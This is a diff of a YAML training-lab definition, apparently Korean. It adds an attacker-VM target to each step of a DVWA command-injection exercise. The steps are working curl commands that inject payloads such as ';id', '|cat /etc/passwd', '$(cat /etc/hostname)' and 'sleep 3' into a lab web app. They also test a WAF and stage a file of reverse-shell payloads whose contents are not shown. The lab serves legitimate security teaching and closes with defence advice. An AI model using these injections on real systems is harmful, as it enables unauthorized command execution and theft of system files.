@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: PING
     field: stdout
+  target_vm: attacker
   script: curl -s -c /tmp/dvwa_cmd.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L > /dev/null && curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' -d 'ip=127.0.0.1&Submit=Submit'
     http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE 'PING|bytes from|ttl=' | head -5
   risk_level: low
@@ -38,6 +39,7 @@ steps:
     type: output_contains
     expect: uid=
     field: stdout
+  target_vm: attacker
   script: curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oP 'uid=\d+\([^)]+\)'
   risk_level: medium
 - order: 3
@@ -51,6 +53,7 @@ steps:
     type: output_contains
     expect: root
     field: stdout
+  target_vm: attacker
   script: curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' -d 'ip=|+cat+/etc/passwd&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -E 'root|www-data|sshd' | head -5
   risk_level: medium
 - order: 4
@@ -65,6 +68,7 @@ steps:
     type: output_contains
     expect: www-data
     field: stdout
+  target_vm: attacker
   script: curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' -d 'ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr+show+eth0&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -E 'www-data|inet ' |
     head -5
   risk_level: medium
@@ -80,6 +84,7 @@ steps:
     type: output_contains
     expect: CMDI_HOSTNAME
     field: stdout
+  target_vm: attacker
   script: curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; echo CMDI_HOSTNAME=$(cat /etc/hostname)' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep
     'CMDI_HOSTNAME'
   risk_level: medium
@@ -94,6 +99,7 @@ steps:
     type: output_contains
     expect: uid=
     field: stdout
+  target_vm: attacker
   script: curl -s -b /tmp/dvwa_cmd.txt -b 'security=medium' -d 'ip=|+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oP 'uid=\d+\([^)]+\)'
   risk_level: medium
 - order: 7
@@ -109,6 +115,7 @@ steps:
     type: output_contains
     expect: Sleep Injection
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low'' -d ''ip=127.0.0.1&Submit=Submit'' -w ''Time: %{time_total}s'' http://10.20.30.80:8080/vulnerabilities/exec/
     && echo '''' && echo ''=== Sleep Injection ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low'' --data-urlencode ''ip=127.0.0.1; sleep 3'' -d ''Submit=Submit'' -w ''Time: %{time_total}s''
     http://10.20.30.80:8080/vulnerabilities/exec/'
@@ -136,6 +143,7 @@ steps:
     type: output_contains
     expect: Reverse shell payloads saved
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/revshell_payload.txt << ''SHELLEOF''
 
     === Reverse Shell Payloads (학습 목적 - 실행 금지) ===
@@ -162,6 +170,7 @@ steps:
     type: output_contains
     expect: ModSecurity WAF
     field: stdout
+  target_vm: attacker
   script: echo '=== DVWA Direct (포트 8080) ===' && curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oP 'uid=[^ ]+'
     | head -1 && echo '=== ModSecurity WAF (포트 80) ===' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;id' && echo '' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?input=127.0.0.1%7Ccat%20/etc/passwd'
   risk_level: low
@@ -178,6 +187,7 @@ steps:
     type: output_contains
     expect: 명령 주입 취약점 진단 보고서
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/cmdi_report.txt << 'EOF'\n=== 명령 주입 취약점 진단 보고서 ===\n대상: DVWA (10.20.30.80:8080)\n\n[메타문자 테스트 결과]\n  ; (세미콜론)  : Low 성공, Medium 필터링\n  | (파이프)    : Low/Medium 모두 성공\n  && (AND)    \
     \  : Low 성공, Medium 필터링\n  $() (치환)    : Low 성공\n  sleep (Blind) : Low 성공 (3초 지연)\n\n[WAF 차단 결과]\n  ModSecurity (포트 80): 932xxx 룰로 차단 (403)\n  직접 접근 (포트 8080): 차단 없음\n\n[방어 권고]\n  1. escapeshellcmd()/escapeshellarg()\
     \ 적용\n  2. 입력값 화이트리스트 (IP 형식만 허용)\n  3. shell_exec() 대신 안전한 API 사용\n  4. WAF 룰 전 포트에 적용\nEOF\ncat /tmp/cmdi_report.txt"
